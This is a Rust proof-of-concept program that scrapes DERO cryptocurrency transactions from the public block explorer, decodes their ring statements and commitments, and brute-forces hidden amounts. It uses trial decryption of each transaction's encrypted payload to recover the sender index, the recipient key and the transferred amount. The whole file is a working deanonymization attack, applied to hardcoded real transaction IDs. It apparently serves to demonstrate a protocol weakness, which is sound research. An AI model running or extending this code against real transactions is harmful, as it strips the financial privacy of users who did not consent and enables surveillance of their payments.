#![allow(unused)]

use std::io;

use num_traits::identities::Zero;

use ark_bn254::*;
use ark_ec::*;
use ark_serialize::*;

use chacha20::cipher::*;

const NORMAL_TX_TYPE: u64 = 3;
const PAYLOAD_RPC_LIMIT: usize = 144;
const PAYLOAD_LIMIT: usize = 1 + PAYLOAD_RPC_LIMIT;

#[derive(Clone, Debug)]
struct Statement {
    root_hash: [u8; 32],
    bytes_per_public_key: u8,
    public_key_pointers: Vec<u8>,
    randomness: [u8; 33],
    commitments: Vec<[u8; 33]>,
    fee: u64,
}

#[derive(Clone, Debug)]
struct Transfer {
    burn_value: u64,
    token_id: [u8; 32],
    rpc_type: u8,
    payload: [u8; PAYLOAD_LIMIT],
    statement: Statement,
}

fn read_byte<R: io::Read>(reader: &mut R) -> u8 {
    let mut byte = [0];
    reader.read_exact(&mut byte).unwrap();
    byte[0]
}

fn read_varint<R: io::Read>(reader: &mut R) -> u64 {
    let mut res = 0u64;
    let mut shift = 0;
    loop {
        let mut byte = u64::from(read_byte(reader));
        if (byte >> 7) == 1 {
            byte &= u64::from(u8::MAX) >> 1;
            res |= byte << shift;
            shift += 7;
        } else {
            res |= byte << shift;
            break;
        }
    }
    res
}

fn read_statement<R: io::Read>(reader: &mut R) -> Statement {
    let ring_len_log = read_byte(reader);
    let ring_len = 1usize << usize::from(ring_len_log);

    let bytes_per_public_key = read_byte(reader);
    let fee = read_varint(reader);

    let mut randomness = [0; 33];
    reader.read_exact(&mut randomness).unwrap();

    let mut public_key_pointers = vec![0; ring_len * usize::from(bytes_per_public_key)];
    reader.read_exact(&mut public_key_pointers);

    let mut commitments = vec![];
    for _ in 0..ring_len {
        let mut commitment = [0; 33];
        reader.read_exact(&mut commitment);
        commitments.push(commitment);
    }

    let mut root_hash = [0; 32];
    reader.read_exact(&mut root_hash);

    Statement {
        root_hash,
        bytes_per_public_key,
        public_key_pointers,
        randomness,
        commitments,
        fee,
    }
}

fn read_transfers<R: io::Read>(reader: &mut R) -> Option<Vec<Transfer>> {
    let _version = read_varint(reader);
    let _source = read_varint(reader);
    let _dest = read_varint(reader);
    let tx_type = read_varint(reader);
    if tx_type != NORMAL_TX_TYPE {
        None?;
    }
    let _height = read_varint(reader);
    let mut _block_id = [0; 32];
    reader.read_exact(&mut _block_id).unwrap();

    let count = read_varint(reader);
    let mut res = vec![];
    for _ in 0..count {
        let burn_value = read_varint(reader);
        let mut token_id = [0; 32];
        reader.read_exact(&mut token_id).unwrap();

        let rpc_type = read_byte(reader);

        let mut payload = [0; PAYLOAD_LIMIT];
        reader.read_exact(&mut payload);

        let statement = read_statement(reader);

        res.push(Transfer {
            burn_value,
            token_id,
            rpc_type,
            payload,
            statement,
        });
    }
    Some(res)
}

fn keccak256(data: &[u8]) -> [u8; 32] {
    use tiny_keccak::Hasher;
    let mut hasher = tiny_keccak::Keccak::v256();
    hasher.update(data);
    let mut res = [0; 32];
    hasher.finalize(&mut res);
    res
}

// These functions map from the bn254 encoding used by Ethereum to the one used by ark-bn254
// These do not bother supporting encoding the identity point
fn decode_point(mut point: Vec<u8>) -> G1Projective {
    let flags = point.pop().unwrap();
    // BE -> LE
    let mut point = point.into_iter().rev().collect::<Vec<_>>();
    let res = G1Projective::deserialize_compressed(point.as_slice()).unwrap();
    if flags == u8::from(res.into_affine().y > (-res).into_affine().y) {
        res
    } else {
        -res
    }
}

fn encode_point(point: G1Projective) -> [u8; 33] {
    let mut point_bytes = [0; 33];
    // LE coordinate and flags
    point.serialize_compressed(point_bytes.as_mut()).unwrap();
    // Clear the flags
    point_bytes[31] &= u8::MAX >> 2;

    // LE -> BE
    let mut rev = point_bytes[..32].iter().rev().cloned().collect::<Vec<_>>();
    point_bytes[..32].copy_from_slice(&rev);

    if point.into_affine().y > (-point).into_affine().y {
        point_bytes[32] = 1;
    }

    assert_eq!(decode_point(point_bytes.to_vec()), point);
    point_bytes
}

// Perform a trial decryption
fn decrypt(
    joint_ring_len: usize,
    shared_key: G1Projective,
    output_key: [u8; 33],
    mut payload: [u8; PAYLOAD_LIMIT],
) -> Option<u8> {
    let mut shared_key_bytes = encode_point(shared_key);
    let mut shared_key: [u8; 32] = keccak256(&shared_key_bytes);

    let key = keccak256(&[shared_key.as_slice(), &output_key].concat());
    chacha20::XChaCha20::new(&key.into(), &[0; 24].into()).apply_keystream(&mut payload);

    // TODO: Also check this supposed sender index matches the sender ring, based on parity
    if usize::from(payload[0]) > joint_ring_len {
        None?;
    }

    // Check the CBOR
    let mut cbor_and_zero_padding = &payload[1..];
    use cbor4ii::core::{
        dec::{Decode, Read},
        types::Map,
        utils::SliceReader,
        Value,
    };
    let mut cbor_and_zero_padding = SliceReader::new(cbor_and_zero_padding);
    let Ok(cbor) = Map::<Vec<(String, Value)>>::decode(&mut cbor_and_zero_padding) else {
        None?
    };
    // If the rest isn't all zeroes, this buffer isn't a zero-padded CBOR object
    for b in cbor_and_zero_padding.fill(usize::MAX).unwrap().as_ref() {
        if *b != 0 {
            None?
        }
    }

    // Check the types are as expected
    for (key, value) in &cbor.0 {
        if !(match key.chars().last() {
            Some('S') => matches!(value, Value::Text(_)),
            Some('I') => matches!(value, Value::Integer(_)),
            Some('U') => matches!(value, Value::Integer(_)),
            Some('F') => matches!(value, Value::Float(_)),
            Some('H') => true, // TODO
            Some('A') => true, // TODO
            Some('T') => true, // TODO
            _ => false,
        }) {
            None?
        }
    }

    dbg!(cbor.0);

    // The first byte is the sender index in the ring since it was 'fixed' six months ago
    Some(payload[0])
}

// Scrape a TX from the explorer
async fn fetch_tx(tx_hash_hex: &str) -> Result<Option<Vec<(Vec<[u8; 33]>, Transfer)>>, ()> {
    let mut lines = reqwest::get("https://explorer.dero.io/tx/".to_string() + tx_hash_hex)
        .await
        .map_err(|_| ())?
        .text()
        .await
        .map_err(|_| ())?
        .lines()
        .map(|str| str.trim().to_string())
        .collect::<Vec<_>>();

    let mut transfers = vec![];
    for i in 1..=lines.len() {
        let line = &lines[lines.len() - i];
        if let Some(line) = line.strip_prefix("<br/>") {
            if let Ok(tx) = hex::decode(line) {
                if tx.is_empty() {
                    continue;
                }
                transfers = if let Some(transfers) = read_transfers(&mut tx.as_slice()) {
                    transfers
                } else {
                    return Ok(None);
                };
                break;
            }
        }
    }
    if transfers.is_empty() {
        Err(())?
    }

    let mut res = vec![];
    let mut lines = lines.into_iter();
    for transfer in transfers {
        let mut keys = vec![];
        for _ in 0..transfer.statement.commitments.len() {
            for addr in lines.by_ref() {
                if let Some(addr) = addr.strip_prefix("<td>") {
                    if let Some(addr) = addr.strip_suffix("</td>") {
                        if addr.strip_prefix("dero1q").is_none() {
                            continue;
                        }
                        let data = bech32::decode(addr).unwrap().1;
                        assert_eq!(data[0], 1);
                        keys.push(<[u8; 33]>::try_from(&data[1..]).unwrap());
                        break;
                    }
                }
            }
        }
        assert_eq!(keys.len(), transfer.statement.commitments.len());
        res.push((keys, transfer));
    }
    Ok(Some(res))
}

async fn fetch_tx_with_retry(tx_hash_hex: &str) -> Option<Vec<(Vec<[u8; 33]>, Transfer)>> {
    loop {
        match fetch_tx(tx_hash_hex).await {
            Ok(Some(tx)) => return Some(tx),
            Ok(None) => None?,
            Err(()) => {
                dbg!("failed to fetch TX");
                tokio::time::sleep(core::time::Duration::from_secs(5)).await;
                continue;
            }
        }
    }
}

fn brute_force_amount(
    keys: &[[u8; 33]],
    commitments: &[G1Projective],
    payload: [u8; PAYLOAD_LIMIT],
    amount_generator: G1Projective,
    amount_increment: u64,
    max_iters: usize,
) -> bool {
    let amount_generator = amount_generator * ark_bn254::Fr::from(amount_increment);

    let mut amount = G1Projective::zero();
    for amount_iter in 0..=max_iters {
        if (amount_iter % 10000) == 0 {
            dbg!(amount_iter);
        }
        // TODO: Only attempt deceryption for the receiver ring, which can be differentiated by parity
        for (key, commitment) in keys.iter().zip(commitments) {
            if let Some(sender) = decrypt(keys.len(), commitment - amount, *key, payload) {
                let sender = hex::encode(keys[usize::from(sender)].as_slice());
                let recipient = hex::encode(key);
                if sender == recipient {
                    println!(
                        "TX encoded recipient as sender and is accordingly on old wallet software"
                    );
                } else {
                    dbg!(sender);
                }
                dbg!(recipient);
                dbg!(u64::try_from(amount_iter).unwrap() * amount_increment); // Amount
                println!("---");
                return true;
            }
        }
        amount += amount_generator;
    }
    false
}

#[allow(clippy::inconsistent_digit_grouping)]
#[tokio::main]
async fn main() {
    let amount_generator = decode_point(
        hex::decode("02eacfbf92b94015c9b0b3d901dae37ec68f74dea7e4484c76d505aade4ad7c001").unwrap(),
    );

    let mut tx_ids: Vec<&str> = vec![
        // This is a TX ID with a known amount (2, which is quite low) found on a GH repo
        "88e4c1731d9d0096bccde4b1766413df7af11e6d41d68284a3b842cd348c96f0", // 2
        // Random TXs
        "6f627d5aba7f36307bbd009540eea7b7b0f5c82de851d8ff425f96eabfc1c6bf", // 135000
        "65a2e916871ba94e1190e16a2a7d998fc195cccc64fab4052610741240599f94", // 12200
        "342cd00ef163b661a5c68790e59efcb7cd76d41dc72a013c596973af06de03b5", // 3995
        "51271a66bfac64c7eff73e66cc81e3abbd74ffe396145df090275b771e668ba0", // 20000
    ];
    for tx_id in tx_ids {
        let Some(tx) = fetch_tx_with_retry(tx_id).await else {
            continue;
        };
        for (t, (keys, transfer)) in tx.into_iter().enumerate() {
            dbg!(tx_id, t);
            assert_eq!(keys.len(), transfer.statement.commitments.len());
            let mut commitments = vec![];
            for commitment in &transfer.statement.commitments {
                commitments.push(decode_point(commitment.to_vec()));
            }

            let mut amount_iter = 0;
            let mut amount = G1Projective::zero();

            // Brute force more likely amounts instead of doing a properly exhaustive search
            // 0 ..= 0.00005 DERO, in atomic units
            if brute_force_amount(
                &keys,
                &commitments,
                transfer.payload,
                amount_generator,
                1,
                5,
            ) {
                continue;
            }
            // 0 ..= 0.5 DERO, in atomic units
            if brute_force_amount(
                &keys,
                &commitments,
                transfer.payload,
                amount_generator,
                1,
                50000,
            ) {
                continue;
            }
            // 0 ..= 400 DERO, in units of .01
            if brute_force_amount(
                &keys,
                &commitments,
                transfer.payload,
                amount_generator,
                1000,
                40000,
            ) {
                continue;
            }
            println!("couldn't brute force amount in a reasonable (for this PoC) amount of time for {tx_id}");
            println!("---");
        }
    }
}
